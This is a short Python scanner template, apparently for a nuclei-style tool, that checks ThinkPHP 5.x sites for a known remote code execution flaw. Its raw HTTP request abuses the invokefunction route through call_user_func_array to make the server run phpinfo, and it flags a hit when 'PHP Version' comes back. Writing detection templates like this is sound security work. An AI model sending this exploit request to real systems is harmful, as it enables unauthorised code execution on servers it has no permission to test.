from nuclei import RawHTTP
http = RawHTTP()
http.set_raw(
r"""GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1 HTTP/1.1
Host: {{Hostname}}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: close

"""
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
http.dump(
    fingers=[
        "thinkphp"
    ],
    id="ThinkPHP5 5.x 远程代码执行漏洞"
)
